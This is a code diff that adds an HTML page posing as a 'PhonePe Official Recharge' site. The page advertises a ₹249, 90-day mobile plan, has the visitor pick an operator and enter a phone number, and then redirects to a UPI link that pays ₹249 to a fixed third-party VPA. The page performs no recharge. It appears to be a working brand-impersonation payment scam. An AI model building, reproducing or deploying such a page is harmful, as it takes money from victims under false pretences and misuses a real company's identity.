@@ -1,0 +1,146 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PhonePe Recharge</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #7b1fa2;
+      color: white;
+      padding: 20px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      letter-spacing: 1px;
+    }
+    .banner {
+      background-color: #e0d9fd;
+      color: #7b1fa2;
+      text-align: center;
+      padding: 15px 10px;
+      font-size: 20px;
+      font-weight: 600;
+    }
+    .container {
+      background-color: white;
+      max-width: 350px;
+      margin: 30px auto;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .operator-btn {
+      margin: 5px;
+      padding: 10px 20px;
+      border: 1px solid #7b1fa2;
+      border-radius: 5px;
+      color: #7b1fa2;
+      cursor: pointer;
+      background-color: white;
+    }
+    .operator-btn.active, .operator-btn:hover {
+      background-color: #7b1fa2;
+      color: white;
+    }
+    input[type='tel'] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    .recharge-btn {
+      background-color: #7b1fa2;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 17px;
+      margin-top: 10px;
+    }
+    .details {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+    .message-box {
+      margin-top: 20px;
+      padding: 10px;
+      background-color: #f1f1f1;
+      border-radius: 5px;
+      font-size: 14px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <header>PhonePe Official Recharge</header>
+  <div class="banner">PhonePe Recharge – Best Offer for 90 Days</div>
+
+  <div class="container">
+    <h2>₹249 Recharge Pack</h2>
+    <p>Validity: 90 Days</p>
+    <p>Data: 2 GB/day + Unlimited</p>
+    <p>Voice: Unlimited Calls</p>
+    <p>SMS: 100/day</p>
+
+    <div>
+      <button class="operator-btn" onclick="selectOperator('Jio')">Jio</button>
+      <button class="operator-btn" onclick="selectOperator('Airtel')">Airtel</button>
+      <button class="operator-btn" onclick="selectOperator('Vi')">Vi</button>
+      <button class="operator-btn" onclick="selectOperator('BSNL')">BSNL</button>
+    </div>
+
+    <input type="tel" id="mobileNumber" maxlength="10" placeholder="Enter 10-digit Mobile Number"/>
+    <button class="recharge-btn" onclick="recharge()">Recharge Now</button>
+
+    <div class="details">
+      Selected Operator: <span id="selectedOperator">None</span>
+    </div>
+
+    <div class="message-box">
+      Secure payment via PhonePe UPI
+    </div>
+  </div>
+
+  <script>
+    let selected = '';
+    function selectOperator(operator) {
+      selected = operator;
+      document.getElementById('selectedOperator').innerText = operator;
+      document.querySelectorAll('.operator-btn').forEach(btn => btn.classList.remove('active'));
+      const buttons = document.querySelectorAll('.operator-btn');
+      buttons.forEach(btn => {
+        if (btn.textContent === operator) {
+          btn.classList.add('active');
+        }
+      });
+    }
+
+    function recharge() {
+      const number = document.getElementById('mobileNumber').value;
+      if (!selected) {
+        alert('Please select a SIM operator.');
+        return;
+      }
+      if (number.length !== 10 || isNaN(number)) {
+        alert('Please enter a valid 10-digit mobile number.');
+        return;
+      }
+      const upiLink = `upi://pay?pa=netc.34161fa820328aa2ccbd3540@mairtel&pn=PhonePeRecharge&am=249&cu=INR&tn=Recharge+for+${number}`;
+      window.location.href = upiLink;
+    }
+  </script>
+</body>
+</html>
